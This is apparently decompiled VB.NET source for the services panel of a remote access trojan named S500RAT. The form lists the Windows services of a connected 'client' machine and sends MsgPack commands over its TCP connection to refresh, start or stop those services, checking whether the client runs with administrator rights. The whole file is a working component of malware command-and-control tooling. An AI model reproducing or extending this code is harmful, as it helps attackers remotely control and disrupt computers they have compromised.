Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000033 RID: 51
	<DesignerGenerated()>
	Public Partial Class FormServices
		Inherits Form

		' Token: 0x06000E96 RID: 3734 RVA: 0x00081659 File Offset: 0x0007F859
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormServices_Load
			AddHandler MyBase.Resize, AddressOf Me.FormServices_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170005F4 RID: 1524
		' (get) Token: 0x06000E99 RID: 3737 RVA: 0x00082857 File Offset: 0x00080A57
		' (set) Token: 0x06000E9A RID: 3738 RVA: 0x00082864 File Offset: 0x00080A64
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170005F5 RID: 1525
		' (get) Token: 0x06000E9B RID: 3739 RVA: 0x000828A7 File Offset: 0x00080AA7
		' (set) Token: 0x06000E9C RID: 3740 RVA: 0x000828B1 File Offset: 0x00080AB1
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x170005F6 RID: 1526
		' (get) Token: 0x06000E9D RID: 3741 RVA: 0x000828BA File Offset: 0x00080ABA
		' (set) Token: 0x06000E9E RID: 3742 RVA: 0x000828C4 File Offset: 0x00080AC4
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005F7 RID: 1527
		' (get) Token: 0x06000E9F RID: 3743 RVA: 0x00082907 File Offset: 0x00080B07
		' (set) Token: 0x06000EA0 RID: 3744 RVA: 0x00082914 File Offset: 0x00080B14
		Friend Overridable Property StopServices As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._StopServices
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StopServices_Click
				Dim stopServices As ToolStripMenuItem = Me._StopServices
				If stopServices IsNot Nothing Then
					RemoveHandler stopServices.Click, value2
				End If
				Me._StopServices = value
				stopServices = Me._StopServices
				If stopServices IsNot Nothing Then
					AddHandler stopServices.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005F8 RID: 1528
		' (get) Token: 0x06000EA1 RID: 3745 RVA: 0x00082957 File Offset: 0x00080B57
		' (set) Token: 0x06000EA2 RID: 3746 RVA: 0x00082961 File Offset: 0x00080B61
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x170005F9 RID: 1529
		' (get) Token: 0x06000EA3 RID: 3747 RVA: 0x0008296A File Offset: 0x00080B6A
		' (set) Token: 0x06000EA4 RID: 3748 RVA: 0x00082974 File Offset: 0x00080B74
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170005FA RID: 1530
		' (get) Token: 0x06000EA5 RID: 3749 RVA: 0x0008297D File Offset: 0x00080B7D
		' (set) Token: 0x06000EA6 RID: 3750 RVA: 0x00082987 File Offset: 0x00080B87
		Private Overridable Property ClientInfo As Label

		' Token: 0x170005FB RID: 1531
		' (get) Token: 0x06000EA7 RID: 3751 RVA: 0x00082990 File Offset: 0x00080B90
		' (set) Token: 0x06000EA8 RID: 3752 RVA: 0x0008299A File Offset: 0x00080B9A
		Public Overridable Property ServicesNum As Label

		' Token: 0x170005FC RID: 1532
		' (get) Token: 0x06000EA9 RID: 3753 RVA: 0x000829A3 File Offset: 0x00080BA3
		' (set) Token: 0x06000EAA RID: 3754 RVA: 0x000829AD File Offset: 0x00080BAD
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170005FD RID: 1533
		' (get) Token: 0x06000EAB RID: 3755 RVA: 0x000829B6 File Offset: 0x00080BB6
		' (set) Token: 0x06000EAC RID: 3756 RVA: 0x000829C0 File Offset: 0x00080BC0
		Friend Overridable Property ListServices As Guna2DataGridView
			<CompilerGenerated()>
			Get
				Return Me._ListServices
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2DataGridView)
				Dim value2 As MouseEventHandler = AddressOf Me.ListServices_MouseUp
				Dim listServices As Guna2DataGridView = Me._ListServices
				If listServices IsNot Nothing Then
					RemoveHandler listServices.MouseUp, value2
				End If
				Me._ListServices = value
				listServices = Me._ListServices
				If listServices IsNot Nothing Then
					AddHandler listServices.MouseUp, value2
				End If
			End Set
		End Property

		' Token: 0x170005FE RID: 1534
		' (get) Token: 0x06000EAD RID: 3757 RVA: 0x00082A03 File Offset: 0x00080C03
		' (set) Token: 0x06000EAE RID: 3758 RVA: 0x00082A10 File Offset: 0x00080C10
		Friend Overridable Property UnstallSoftware As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UnstallSoftware
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StartServices_Click
				Dim unstallSoftware As ToolStripMenuItem = Me._UnstallSoftware
				If unstallSoftware IsNot Nothing Then
					RemoveHandler unstallSoftware.Click, value2
				End If
				Me._UnstallSoftware = value
				unstallSoftware = Me._UnstallSoftware
				If unstallSoftware IsNot Nothing Then
					AddHandler unstallSoftware.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170005FF RID: 1535
		' (get) Token: 0x06000EAF RID: 3759 RVA: 0x00082A53 File Offset: 0x00080C53
		' (set) Token: 0x06000EB0 RID: 3760 RVA: 0x00082A5D File Offset: 0x00080C5D
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000600 RID: 1536
		' (get) Token: 0x06000EB1 RID: 3761 RVA: 0x00082A66 File Offset: 0x00080C66
		' (set) Token: 0x06000EB2 RID: 3762 RVA: 0x00082A70 File Offset: 0x00080C70
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000601 RID: 1537
		' (get) Token: 0x06000EB3 RID: 3763 RVA: 0x00082A79 File Offset: 0x00080C79
		' (set) Token: 0x06000EB4 RID: 3764 RVA: 0x00082A83 File Offset: 0x00080C83
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000602 RID: 1538
		' (get) Token: 0x06000EB5 RID: 3765 RVA: 0x00082A8C File Offset: 0x00080C8C
		' (set) Token: 0x06000EB6 RID: 3766 RVA: 0x00082A96 File Offset: 0x00080C96
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000603 RID: 1539
		' (get) Token: 0x06000EB7 RID: 3767 RVA: 0x00082A9F File Offset: 0x00080C9F
		' (set) Token: 0x06000EB8 RID: 3768 RVA: 0x00082AAC File Offset: 0x00080CAC
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000604 RID: 1540
		' (get) Token: 0x06000EB9 RID: 3769 RVA: 0x00082AEF File Offset: 0x00080CEF
		' (set) Token: 0x06000EBA RID: 3770 RVA: 0x00082AF9 File Offset: 0x00080CF9
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x17000605 RID: 1541
		' (get) Token: 0x06000EBB RID: 3771 RVA: 0x00082B02 File Offset: 0x00080D02
		' (set) Token: 0x06000EBC RID: 3772 RVA: 0x00082B0C File Offset: 0x00080D0C
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x17000606 RID: 1542
		' (get) Token: 0x06000EBD RID: 3773 RVA: 0x00082B15 File Offset: 0x00080D15
		' (set) Token: 0x06000EBE RID: 3774 RVA: 0x00082B1F File Offset: 0x00080D1F
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x17000607 RID: 1543
		' (get) Token: 0x06000EBF RID: 3775 RVA: 0x00082B28 File Offset: 0x00080D28
		' (set) Token: 0x06000EC0 RID: 3776 RVA: 0x00082B32 File Offset: 0x00080D32
		Friend Overridable Property Column6 As DataGridViewTextBoxColumn

		' Token: 0x17000608 RID: 1544
		' (get) Token: 0x06000EC1 RID: 3777 RVA: 0x00082B3B File Offset: 0x00080D3B
		' (set) Token: 0x06000EC2 RID: 3778 RVA: 0x00082B45 File Offset: 0x00080D45
		Friend Overridable Property Column1 As DataGridViewTextBoxColumn

		' Token: 0x17000609 RID: 1545
		' (get) Token: 0x06000EC3 RID: 3779 RVA: 0x00082B4E File Offset: 0x00080D4E
		' (set) Token: 0x06000EC4 RID: 3780 RVA: 0x00082B58 File Offset: 0x00080D58
		Public Property Client As Clients

		' Token: 0x1700060A RID: 1546
		' (get) Token: 0x06000EC5 RID: 3781 RVA: 0x00082B61 File Offset: 0x00080D61
		' (set) Token: 0x06000EC6 RID: 3782 RVA: 0x00082B6B File Offset: 0x00080D6B
		Public Property F As FormS500

		' Token: 0x1700060B RID: 1547
		' (get) Token: 0x06000EC7 RID: 3783 RVA: 0x00082B74 File Offset: 0x00080D74
		' (set) Token: 0x06000EC8 RID: 3784 RVA: 0x00082B7E File Offset: 0x00080D7E
		Public Property FullPath As String

		' Token: 0x1700060C RID: 1548
		' (get) Token: 0x06000EC9 RID: 3785 RVA: 0x00082B87 File Offset: 0x00080D87
		' (set) Token: 0x06000ECA RID: 3786 RVA: 0x00082B91 File Offset: 0x00080D91
		Friend Property ParentClient As Clients

		' Token: 0x1700060D RID: 1549
		' (get) Token: 0x06000ECB RID: 3787 RVA: 0x00082B9A File Offset: 0x00080D9A
		' (set) Token: 0x06000ECC RID: 3788 RVA: 0x00082BA4 File Offset: 0x00080DA4
		Public Property Admin As Boolean

		' Token: 0x06000ECD RID: 3789 RVA: 0x00082BB0 File Offset: 0x00080DB0
		Private Sub FormServices_Load(sender As Object, e As EventArgs)
			Me.ListServices.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListServices.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListServices.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListServices.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListServices.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListServices.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListServices.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListServices.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListServices.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000ECE RID: 3790 RVA: 0x00082DA4 File Offset: 0x00080FA4
		Private Sub FormServices_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000ECF RID: 3791 RVA: 0x00082E38 File Offset: 0x00081038
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000ED0 RID: 3792 RVA: 0x00082EA4 File Offset: 0x000810A4
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000ED1 RID: 3793 RVA: 0x00082EBC File Offset: 0x000810BC
		Private Sub StopServices_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Admin
			If flag Then
				MessageBox.Show("The client is not running as an administrator so you can't stop the service!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			Else
				Dim flag2 As Boolean = Me.ListServices.Rows.Count > 0
				If flag2 Then
					Try
						For Each obj As Object In Me.ListServices.SelectedRows
							Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "Stop"
							msgPack.ForcePathObject("ServicesStop").AsString = dataGridViewRow.Cells(1).Value.ToString()
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Catch ex As Exception
						Console.WriteLine(ex.Message)
					End Try
				End If
			End If
		End Sub

		' Token: 0x06000ED2 RID: 3794 RVA: 0x00082FD0 File Offset: 0x000811D0
		Private Sub StartServices_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Admin
			If flag Then
				MessageBox.Show("The client is not running as an administrator so you can't start the service!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			Else
				Dim flag2 As Boolean = Me.ListServices.Rows.Count > 0
				If flag2 Then
					Try
						For Each obj As Object In Me.ListServices.SelectedRows
							Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "Start"
							msgPack.ForcePathObject("ServicesStart").AsString = dataGridViewRow.Cells(1).Value.ToString()
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Next
					Catch ex As Exception
						Console.WriteLine(ex.Message)
					End Try
				End If
			End If
		End Sub

		' Token: 0x06000ED3 RID: 3795 RVA: 0x000830E4 File Offset: 0x000812E4
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "List"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x06000ED4 RID: 3796 RVA: 0x0008312C File Offset: 0x0008132C
		Private Sub ListServices_MouseUp(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Right
			If flag Then
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(Me.ListServices.SelectedCells(3).Value, "Running", False)
				If flag2 Then
					Me.UnstallSoftware.Enabled = False
					Me.StopServices.Enabled = True
				Else
					Me.UnstallSoftware.Enabled = True
					Me.StopServices.Enabled = False
				End If
			End If
		End Sub

		' Token: 0x040006A5 RID: 1701
		Private FormSize As Boolean
	End Class
End Namespace
